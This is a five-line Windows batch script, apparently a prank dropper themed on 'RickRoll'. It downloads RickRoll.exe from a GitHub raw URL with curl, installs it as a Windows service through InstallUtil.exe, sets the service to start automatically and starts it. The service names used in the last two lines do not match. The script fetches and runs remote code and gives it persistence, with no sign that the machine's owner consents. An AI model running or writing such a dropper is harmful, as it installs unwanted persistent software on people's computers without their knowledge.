cd C:\Windows\Microsoft.NET\Framework\v4.0.30319
curl -L -o %~dp0RickRoll.exe https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/RickRoll.exe
InstallUtil.exe %~dp0RickRoll.exe
sc config RicksService start=auto
net start AstleyLovesYou
